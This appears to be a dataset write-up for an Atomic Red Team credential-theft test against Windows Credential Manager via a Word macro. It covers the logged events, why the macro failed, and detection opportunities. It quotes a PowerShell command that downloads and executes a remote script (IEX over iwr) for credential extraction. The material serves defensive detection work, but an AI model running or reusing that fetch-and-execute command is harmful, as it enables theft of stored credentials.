# T1555-1: Credentials from Password Stores — Extract Windows Credential Manager via VBA

## Technique Context

T1555 covers credential theft from password stores — repositories where applications and the OS persist credentials between sessions. This test targets the Windows Credential Manager using a VBA macro embedded in a Word document. The Credential Manager stores Windows credentials (domain authentication tokens, saved network passwords) and web credentials (browser-saved form logins) in the user's vault at `%LOCALAPPDATA%\Microsoft\Credentials` and `%APPDATA%\Microsoft\Credentials`. A VBA macro approach simulates the adversary tactic of embedding credential-harvesting code inside an Office document, commonly delivered via phishing.

## What This Dataset Contains

The dataset spans approximately 10 seconds (2026-03-14T00:36:55Z – 00:37:05Z) and captures execution of ART test T1555-1 on ACME-WS02.

**The attack payload is visible in PowerShell EID 4104 script block logging:**

> `& {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12`
> `IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)`
> `Invoke-Maldoc -macroFile "C:\AtomicRedTeam\atomics\T1555\src\T1555-macrocode.txt" -officeProduct "Word" -sub "Extract"}`

The `Invoke-MalDoc` helper retrieves a PowerShell module from raw.githubusercontent.com, then programmatically opens a Word document with a macro that calls a subroutine named `Extract`. Sysmon EID 22 records the DNS query for `raw.githubusercontent.com` resolving to 185.199.108-111.133 (GitHub's CDN), and there is a `WmiPrvSE.exe` process creation (Sysmon EID 1, tagged T1047) consistent with Word document manipulation triggering WMI activity.

The PowerShell log includes a **PowerShell EID 4100 error**:

> `Retrieving the COM class factory for component with CLSID {00000000-0000-0000-0000-000000000000} failed due to the following error: 80040154 Class not registered (REGDB_E_CLASSNOTREG)`

This error indicates that `Invoke-MalDoc` attempted to instantiate a COM object for Microsoft Word (`{00000000...}` is a placeholder CLSID), but Word is not installed on ACME-WS02. The test was attempted but did not execute the macro. This is an expected outcome on a machine without an Office installation.

Security events include EID 4624/4627/4672 (logon and special logon for SYSTEM), EID 4688 for the PowerShell and whoami.exe process creates, and EID 4703 for token right adjustment.

The `Invoke-MalDoc.ps1` function body is captured in full in a 4104 scriptblock — including its parameters, the logic for temporarily modifying the Word macro security registry key, and the COM automation steps — providing high-fidelity visibility into the tool's operation even though execution failed.

## What This Dataset Does Not Contain (and Why)

**Actual macro execution or credential extraction.** Microsoft Word is not installed on ACME-WS02. The COM class registration failure at `80040154` terminates the attack chain before any macro runs. There are no events from Word itself, no file access to the Credentials folder, and no CredEnum API calls.

**Windows Defender block.** The technique did not reach AMSI-scannable macro execution — it failed earlier at COM instantiation. No 0xC0000022 access denied events appear.

**Office-related Sysmon events.** No `WINWORD.EXE` process creation, child process spawning from Office, or COM surrogate (`dllhost.exe`) events are present, as the Office runtime never loaded.

## Assessment

This dataset captures the **network retrieval phase and tool initialization**, but not the credential extraction itself. The technique was blocked by the absence of Microsoft Word rather than by a security control. The telemetry is forensically valuable for the earlier stages: the PowerShell command reconstructing the IEX chain, DNS resolution to GitHub, and the tool's attempt to use COM automation are all faithfully recorded. Defenders can use this dataset to tune detection on the test framework stage — the IEX-over-IWR pattern pulling from raw.githubusercontent.com — while understanding that the actual credential store access did not occur.

## Detection Opportunities Present in This Data

- **PowerShell EID 4104**: Scriptblock captures `IEX (iwr "https://raw.githubusercontent.com/...Invoke-MalDoc.ps1" ...)` and the full `Invoke-MalDoc` function body. The `Invoke-Maldoc` function name and macro file path to `T1555-macrocode.txt` are directly observable.
- **PowerShell EID 4103**: `Invoke-WebRequest` module logging records the exact URL fetched, even before script execution occurs.
- **Sysmon EID 22**: DNS query for `raw.githubusercontent.com` from a SYSTEM-context PowerShell process. Unusual for normal workstation operation.
- **PowerShell EID 4100**: The `REGDB_E_CLASSNOTREG` error with a zero CLSID is a fingerprint of `Invoke-MalDoc` failing to find the Word COM object; this error is specific to the tool and can indicate its presence.
- **Security EID 4688**: `powershell.exe` launched with the full IEX/IWR/Invoke-Maldoc command visible in the command line field.
- **Sysmon EID 1**: WmiPrvSE.exe launch during the execution window (tagged T1047) — not directly related to credential theft but contextually relevant when co-occurring with these other indicators.
